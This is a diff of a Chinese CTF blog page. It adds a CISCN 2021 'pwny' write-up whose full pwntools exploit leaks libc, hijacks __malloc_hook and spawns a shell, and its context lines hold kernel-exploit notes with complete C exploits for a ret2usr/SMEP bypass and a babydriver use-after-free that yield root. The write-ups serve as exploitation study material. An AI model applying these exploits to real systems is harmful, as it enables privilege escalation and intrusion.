@@ -141,6 +141,90 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/06/09/2021-ciscn-pwn初赛/" >2021_ciscn_pwn初赛</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-06-09  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>文件下载</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>libc</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="pwny">附件</a></td>
+<td><a href="libc-2.27.so">libc</a></td>
+</tr>
+</tbody></table>
+<h3 id="0-检查保护"><a href="#0-检查保护" class="headerlink" title="0.检查保护"></a>0.检查保护</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/ciscn$ file pwny </span><br><span class="line">pwny: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a14a51d7799ec9c936f0c8096c737470a079001b, stripped</span><br><span class="line">winter@ubuntu:~/ciscn$ checksec pwny </span><br><span class="line">[*] '/home/winter/ciscn/pwny'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>64位程序，保护全开。</p>
+<h3 id="1-程序流程"><a href="#1-程序流程" class="headerlink" title="1.程序流程"></a>1.程序流程</h3><h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>最开始有一个函数，进行初始化操作setvbuf，并且打开一个文件设备’/dev/urandom’，并且将文件描述符存储在了bss上0x202860的位置。</p>
+<p><img src="/2021/06/09/2021-ciscn-pwn%E5%88%9D%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210609103625666.png" alt="image-20210609103625666"></p>
+<h4 id="fun-write函数"><a href="#fun-write函数" class="headerlink" title="fun_write函数"></a>fun_write函数</h4><p><img src="/2021/06/09/2021-ciscn-pwn%E5%88%9D%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210609103827543.png" alt="image-20210609103827543"></p>
+<ol>
+<li>请求输入偏移</li>
+<li>偏移存储在v0中</li>
+<li>从文件描述符0x202860中读取数据，存储到v2中</li>
+<li>将v2的值赋值给（0x202060+偏移）的地址</li>
+</ol>
+<h4 id="fun-read函数"><a href="#fun-read函数" class="headerlink" title="fun_read函数"></a>fun_read函数</h4><p><img src="/2021/06/09/2021-ciscn-pwn%E5%88%9D%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210609104021390.png" alt="image-20210609104021390"></p>
+<p>与fun_write函数类似，只不过最后的赋值变成了，打印（0x202060+偏移）的内容。</p>
+<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>函数fun_read和fun_write，都有函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(byte_202860,&amp;v2,<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>很显然，需要将byte_202860修改为常用0 =&gt; 控制v2 =&gt; 根据整数溢出，fun_write获得任意地址写，fun_read获得任意地址读。</p>
+<h4 id="byte-202860-0"><a href="#byte-202860-0" class="headerlink" title="byte_202860 = 0"></a>byte_202860 = 0</h4><p>看fun_write函数：</p>
+<p>首先，<code>byte_202860</code>在<code>qword_202060</code>下面100字节处，所以，只要输入的idx为0x100，那么就可以修改byte_202860的值。</p>
+<p>其次，由于v2的值是从/dev/urandom里面读取的，所以第一次修改byte_202860为一个随机值。</p>
+<p>但是，如果再来一次，由于上次byte_202860被修改为一个随机值，此时找不到对应的文件描述符，那么，取出来的数都为0，则，v2的值为0，可以再次修改byte_202860的值为0，则成功修改byte_202860为0。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>((<span class="keyword">unsigned</span> __int8)byte_202860, &amp;v2, <span class="number">8u</span>LL);</span><br><span class="line">=&gt;</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;v2, <span class="number">8u</span>LL);</span><br></pre></td></tr></table></figure>
+
+<p>v2的值可以控制，那么就控制了bss上的数据，可以读可以写。</p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ul>
+<li>修改byte_202860=0</li>
+<li>读bss上stderr 的地址，泄露libc</li>
+<li>读data上off_202008，泄露程序基地址</li>
+<li>修改malloc_hook为one_gadget【需要realloc调整栈帧】</li>
+<li>scanf的时候，读入一个很大的数【‘1’*0x400（格式化参数是ld，要数字才能读入）】，会进行一次malloc</li>
+<li>getshell</li>
+</ul>
+<h3 id="3-完整exp"><a href="#3-完整exp" class="headerlink" title="3.完整exp"></a>3.完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./pwny")</span></span><br><span class="line"><span class="comment"># ld_path = "/usr/local/glibc-2.27/lib/ld-2.27.so"</span></span><br><span class="line"><span class="comment"># libc_path = "/usr/local/glibc-2.27/lib/libc-2.27.so"</span></span><br><span class="line">file = <span class="string">"./pwny"</span></span><br><span class="line"><span class="comment"># p = process([ld_path, file],</span></span><br><span class="line"><span class="comment">#             env=&#123;"LD_PRELOAD":libc_path&#125;)</span></span><br><span class="line">libc_path = <span class="string">"./libc-2.27.so"</span></span><br><span class="line">p = process(file,</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:libc_path&#125;)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_read</span><span class="params">(index)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_write</span><span class="params">(index)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">fun_write(<span class="number">0x100</span>)</span><br><span class="line">fun_write(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">fun_read(p64(<span class="number">0xfffffffffffffffc</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Result: "</span>)</span><br><span class="line">_IO_2_1_stderr_ = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"_IO_2_1_stderr_:"</span>+hex(_IO_2_1_stderr_))</span><br><span class="line">libc_base = _IO_2_1_stderr_ - libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">fun_read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Result: "</span>)</span><br><span class="line">data = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"data:"</span>+hex(data))</span><br><span class="line">pro_base = data <span class="number">-0x202008</span></span><br><span class="line">log.success(<span class="string">"pro_base:"</span>+hex(pro_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget = [0x415e6,0x4163a,0xdfac1]</span></span><br><span class="line">gadget = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">one_gadget = libc_base + gadget[<span class="number">1</span>]</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span>+hex(one_gadget))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">offset = (malloc_hook - (pro_base + <span class="number">0x202060</span>)) / <span class="number">8</span></span><br><span class="line"></span><br><span class="line">fun_write(offset)</span><br><span class="line">p.sendline(p64(realloc+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#realloc</span></span><br><span class="line">fun_write(offset<span class="number">-1</span>)</span><br><span class="line">p.sendline(p64(one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(<span class="string">'1'</span>*<span class="number">0x400</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><blockquote>
+<p>注意：</p>
+<ol>
+<li>本次给的libc是新版的libc</li>
+<li>旧版libc没有检查tcache的double free</li>
+<li>新版有了</li>
+</ol>
+<p>2.27堆保护和2.31一样 =&gt; 用2.31做 =&gt; 换2.29的libc</p>
+</blockquote>
+
+	
+	</div>
+  <a type="button" href="/2021/06/09/2021-ciscn-pwn初赛/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/06/06/os真象还原/" >os真象还原-笔记</a>
 		</h3>
 		</div>
@@ -511,7 +595,7 @@ var _hmt = _hmt || [];
 
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file lkms .text地址 (-s .bss .bss地址 -s .data .data地址)</span><br><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/tostring.ko 0xc8824000 -s .bss 0xc8824600 -s .data 0xc8824360</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote:1234	[启动文件里面-s默认端口是1234]</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote:1234	[启动文件里面-s默认端口是1234](指定端口:-gdb tcp::4869 )</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/06/05/kernel-study/image-20210531151735100.png" alt="image-20210531151735100"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#下断点，一般下在write、read上面</span><br><span class="line">b tostring_write</span><br></pre></td></tr></table></figure>
@@ -789,7 +873,7 @@ var _hmt = _hmt || [];
 <h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">5</span>];</span><br><span class="line">    init_tf_work();</span><br><span class="line">    *((<span class="keyword">void</span>**)(Get_shell)) = &amp;payload;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">56</span>;i &lt; <span class="number">4</span>;i++,j++)&#123;</span><br><span class="line">        Payload[j] = Get_shell[i];<span class="comment">//绕过smep后加上提权和get shell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/06/05/kernel-study/image-20210605001430795.png" alt="image-20210605001430795"></p>
-<h2 id="4-CISCN2017-–-babydriver"><a href="#4-CISCN2017-–-babydriver" class="headerlink" title="4.CISCN2017 – babydriver"></a>4.CISCN2017 – babydriver</h2><h4 id="下载文件-3"><a href="#下载文件-3" class="headerlink" title="下载文件"></a>下载文件</h4><p>wiki中有这道，可以上github的ctf-challenge中下载</p>
+<h3 id="4-CISCN2017-–-babydriver"><a href="#4-CISCN2017-–-babydriver" class="headerlink" title="4.CISCN2017 – babydriver"></a>4.CISCN2017 – babydriver</h3><h4 id="下载文件-3"><a href="#下载文件-3" class="headerlink" title="下载文件"></a>下载文件</h4><p>wiki中有这道，可以上github的ctf-challenge中下载</p>
 <p><a href="babydriver.tar">附件</a></p>
 <p>一共给了三个文件：boot.sh、bzImage和rootfs.cpio</p>
 <ul>
@@ -918,6 +1002,34 @@ var _hmt = _hmt || [];
 <h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//申请两个设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd1:%d\n"</span>,fd1);<span class="comment">//文件描述符3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd2:%d\n"</span>,fd2);<span class="comment">//文件描述符4</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xA8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放fd1，此时，LKMs2的device_buf将指向一块大小为sizeof(struct cred)的已free的内存</span></span><br><span class="line">    <span class="built_in">close</span>(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间将占用那一块已free的内存</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 篡改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">write</span>(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/06/05/kernel-study/image-20210606154209689.png" alt="image-20210606154209689"></p>
+<h3 id="5-2020高校战疫分享赛-–-Kernoob"><a href="#5-2020高校战疫分享赛-–-Kernoob" class="headerlink" title="5.2020高校战疫分享赛 – Kernoob"></a>5.2020高校战疫分享赛 – Kernoob</h3><h4 id="下载文件-4"><a href="#下载文件-4" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="Kernoob.zip">附件</a>        <a href="https://adworld.xctf.org.cn/match/contest_challenge?event=134&hash=a94cbc83-14c0-4de3-85f8-55ef6ed4361c.event" target="_blank" rel="noopener">链接</a></p>
+<p>给了四个文件：bzImage、initramfs.cpio、noob.ko和startvm.sh</p>
+<h4 id="预备-2"><a href="#预备-2" class="headerlink" title="预备"></a>预备</h4><ol>
+<li><p>解压cpio的dc.sh</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mkdir initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.cpio</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打包文件系统initramfs.cpio的ci.sh</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>程序基址</p>
+<p>本程序没有lib文件夹</p>
+<p>方法是<code>grep noob /proc/kallsyms</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">~ $ grep noob /proc/kallsyms</span><br><span class="line">ffffffffc0002000 t copy_overflow	[noob]</span><br><span class="line">ffffffffc0003120 r kernel_read_file_str	[noob]</span><br><span class="line">ffffffffc0002043 t add_note	[noob]</span><br><span class="line">ffffffffc000211c t del_note	[noob]</span><br><span class="line">ffffffffc0002180 t show_note	[noob]</span><br><span class="line">ffffffffc00022d8 t edit_note	[noob]</span><br><span class="line">ffffffffc0002431 t noob_ioctl	[noob]</span><br><span class="line">ffffffffc0004000 d fops	[noob]</span><br><span class="line">ffffffffc0004100 d misc	[noob]</span><br><span class="line">ffffffffc0003078 r .LC1	[noob]</span><br><span class="line">ffffffffc00044c0 b pool	[noob]</span><br><span class="line">ffffffffc0004180 d __this_module	[noob]</span><br><span class="line">ffffffffc00024f2 t cleanup_module	[noob]</span><br><span class="line">ffffffffc00024ca t init_module	[noob]</span><br><span class="line">ffffffffc00024f2 t noob_exit	[noob]</span><br><span class="line">ffffffffc00024ca t noob_init	[noob]</span><br></pre></td></tr></table></figure>
+
+<p>其中t、d、b开头的地址就是.text、.data和.bss的基地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">add-symbol-file noob.ko 0xffffffffc0002000 -s .data 0xffffffffc0004000 -s .bss 0xffffffffc00044C0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关闭端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp |grep 1234</span><br><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>
+</li>
+<li></li>
+</ol>
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><h5 id="init-1"><a href="#init-1" class="headerlink" title="init"></a>init</h5><p>这次init是空的，故该为查看<code>/etc/init.d/rcS</code></p>
